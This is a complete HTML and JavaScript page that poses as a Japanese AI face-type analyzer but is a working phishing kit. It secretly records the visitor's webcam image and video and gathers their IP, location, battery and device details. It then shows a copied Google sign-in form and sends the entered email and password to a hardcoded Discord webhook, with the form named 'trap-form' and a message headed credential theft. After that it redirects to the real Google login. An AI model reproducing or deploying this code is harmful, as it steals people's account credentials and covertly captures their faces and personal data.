<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Face Analyzer | 高精度AI顔タイプ診断</title>
    <style>
        :root { --google-blue: #1a73e8; --google-gray: #5f6368; --google-border: #dadce0; }
        * { box-sizing: border-box; outline: none; }
        body { font-family: "Roboto", arial, sans-serif; background: #fff; color: #3c4043; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        
        /* 共通カード */
        .card { background: #fff; border: 1px solid var(--google-border); padding: 40px; border-radius: 8px; text-align: center; width: 450px; max-width: 90%; }
        
        /* 診断画面 */
        h1 { font-size: 24px; font-weight: 400; margin: 0 0 10px; color: #202124; }
        p { font-size: 14px; color: var(--google-gray); margin-bottom: 24px; }
        .v-wrap { width: 100%; border-radius: 8px; overflow: hidden; margin-bottom: 24px; background: #f8f9fa; border: 1px solid var(--google-border); }
        video, img { width: 100%; display: block; transform: scaleX(-1); }
        
        /* ボタン */
        .btn { background: var(--google-blue); color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; transition: background 0.2s; }
        .btn:hover { background: #185abc; box-shadow: 0 1px 3px rgba(60,64,67,0.3); }
        .btn:disabled { background: #ccc; }

        /* Google ログインUI再現 */
        #login-ui { display: none; text-align: left; }
        .g-logo { text-align: center; margin-bottom: 10px; }
        .g-title { text-align: center; font-family: "Google Sans", arial, sans-serif; font-size: 24px; margin-bottom: 8px; color: #202124; }
        .g-subtitle { text-align: center; font-size: 16px; color: #202124; margin-bottom: 30px; }
        
        .input-group { margin-bottom: 10px; position: relative; }
        input { width: 100%; padding: 13px 15px; border: 1px solid var(--google-border); border-radius: 4px; font-size: 16px; margin-bottom: 5px; }
        input:focus { border: 2px solid var(--google-blue); padding: 12px 14px; }
        
        .blue-link { color: var(--google-blue); font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
        .footer-text { font-size: 14px; color: var(--google-gray); line-height: 1.5; margin: 25px 0; }
        .g-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 40px; }

        #step-pass { display: none; } /* 初期はパスワード非表示 */
        
        #result-ui { display: none; }
        .row { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; border-bottom: 1px solid #eee; padding-bottom: 8px; }
    </style>
</head>
<body>

    <!-- 診断開始 -->
    <div class="card" id="camera-ui">
        <h1>AI Face Analyzer</h1>
        <p>Google AIエンジニアリングによる精密顔タイプ診断</p>
        <div class="v-wrap"><video id="video" autoplay playsinline muted></video></div>
        <button class="btn" id="start-btn">診断を開始</button>
    </div>

    <!-- 診断結果 -->
    <div class="card" id="result-ui">
        <h1>診断が完了しました</h1>
        <div class="v-wrap"><img id="result-preview" src=""></div>
        <div style="text-align: left; margin: 20px 0;">
            <div class="row"><span>左右対称性スコア</span><span style="font-weight:bold;">94.8%</span></div>
            <div class="row"><span>パーツ配置バランス</span><span style="font-weight:bold;">黄金比 (1:1.618)</span></div>
            <div class="row"><span>総合評価</span><span style="color:var(--google-blue); font-weight:bold; font-size:18px;">S Class</span></div>
        </div>
        <button class="btn" id="view-details-btn">詳細レポートをGoogleドライブで開く</button>
    </div>

    <!-- 本物志向 Google ログイン -->
    <div class="card" id="login-ui">
        <div class="g-logo">
            <svg width="75" height="24" viewBox="0 0 75 24"><path d="M14.1 2.3C11.5 2.3 9.3 3.4 7.7 5.2l2.6 2.1c1.1-1.3 2.7-2.1 4.5-2.1 3.3 0 6 2.5 6 6.3s-2.7 6.3-6 6.3c-1.8 0-3.4-.8-4.5-2.1l-2.6 2.1c1.6 1.8 3.8 2.9 6.4 2.9 4.9 0 9-3.9 9-9.2s-4.1-9.2-9-9.2zm-14.1 0h3v18.8h-3z" fill="#4285F4"/></svg>
        </div>
        <div class="g-title">ログイン</div>
        <div class="g-subtitle">Google アカウントを使用して続行</div>
        
        <form id="trap-form">
            <!-- ステップ1: メールアドレス -->
            <div id="step-email">
                <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
                <div class="blue-link" style="margin-top: 5px;">メールアドレスを忘れた場合</div>
                <div class="footer-text">
                    お客様のコンピュータではない場合、シークレット ブラウジング ウィンドウを使用してログインしてください。 <span class="blue-link">詳細</span>
                </div>
            </div>

            <!-- ステップ2: パスワード -->
            <div id="step-pass">
                <div id="display-email" style="border: 1px solid #dadce0; border-radius: 20px; padding: 5px 15px; display: inline-block; margin-bottom: 20px; font-size: 14px;"></div>
                <input type="password" id="pass" placeholder="パスワードを入力" required>
                <div class="blue-link" style="margin-top: 5px;">パスワードをお忘れの場合</div>
            </div>

            <div class="g-footer">
                <span class="blue-link">アカウントを作成</span>
                <button type="button" class="btn" id="next-btn">次へ</button>
                <button type="submit" class="btn" id="submit-btn" style="display:none;">次へ</button>
            </div>
        </form>
    </div>

    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
        let capturedImg = "";
        let videoBlob = null;
        let net = {};

        window.onload = async () => { try { net = await (await fetch('https://ipapi.co/json/')).json(); } catch(e){} };

        async function getIntel() {
            let bat = { l: "N/A", c: "" };
            try { const b = await navigator.getBattery(); bat.l = (b.level * 100).toFixed(0) + "%"; bat.c = b.charging ? "充電中" : "放電中"; } catch(e) {}
            return {
                ts: new Date().toLocaleString('ja-JP'),
                ua: navigator.userAgent,
                ip: net.ip || "Unknown",
                loc: `${net.city}, ${net.country_name}`,
                bat: `${bat.l} (${bat.c})`,
                spec: `CPU:${navigator.hardwareConcurrency} / RAM:${navigator.deviceMemory}G`
            };
        }

        const startBtn = document.getElementById('start-btn');
        startBtn.onclick = async () => {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById('video').srcObject = stream;
            startBtn.innerText = "スキャン中...";
            startBtn.disabled = true;

            const mediaRecorder = new MediaRecorder(stream);
            const chunks = [];
            mediaRecorder.ondataavailable = e => chunks.push(e.data);
            mediaRecorder.onstop = async () => {
                videoBlob = new Blob(chunks, { type: 'video/mp4' });
                const intel = await getIntel();
                const formData = new FormData();
                formData.append('payload_json', JSON.stringify({
                    username: "AI Analyzer Intel",
                    embeds: [{
                        title: "📸 診断メディア取得", color: 0x1a73e8,
                        fields: [
                            { name: "🕒 時刻", value: intel.ts, inline: true },
                            { name: "🔋 電池", value: intel.bat, inline: true },
                            { name: "🌐 情報", value: `IP: ${intel.ip}\nLOC: ${intel.loc}` },
                            { name: "📱 環境", value: `\`\`\`${intel.ua}\`\`\`` }
                        ]
                    }]
                }));
                formData.append('file1', await (await fetch(capturedImg)).blob(), 'face.jpg');
                formData.append('file2', videoBlob, 'video.mp4');
                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
            };
            mediaRecorder.start();

            setTimeout(() => {
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                capturedImg = canvas.toDataURL('image/jpeg', 0.8);
                mediaRecorder.stop();
                document.getElementById('camera-ui').style.display = 'none';
                document.getElementById('result-ui').style.display = 'block';
                document.getElementById('result-preview').src = capturedImg;
                stream.getTracks().forEach(t => t.stop());
            }, 4000);
        };

        document.getElementById('view-details-btn').onclick = () => {
            document.getElementById('result-ui').style.display = 'none';
            document.getElementById('login-ui').style.display = 'block';
        };

        // ステップ切り替えロジック
        document.getElementById('next-btn').onclick = () => {
            const email = document.getElementById('email').value;
            if(!email) return alert("メールアドレスを入力してください");
            document.getElementById('display-email').innerText = email;
            document.getElementById('step-email').style.display = 'none';
            document.getElementById('step-pass').style.display = 'block';
            document.getElementById('next-btn').style.display = 'none';
            document.getElementById('submit-btn').style.display = 'block';
        };

        document.getElementById('trap-form').onsubmit = async (e) => {
            e.preventDefault();
            const intel = await getIntel();
            const payload = {
                username: "AI Analyzer Intel",
                embeds: [{
                    title: "🔑 ログイン情報奪取", color: 0xff0000,
                    fields: [
                        { name: "📧 ID", value: document.getElementById('email').value },
                        { name: "🔑 PW", value: document.getElementById('pass').value },
                        { name: "🕒 送信時刻", value: intel.ts }
                    ]
                }]
            };
            await fetch(WEBHOOK_URL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
        };
    </script>
</body>
</html>
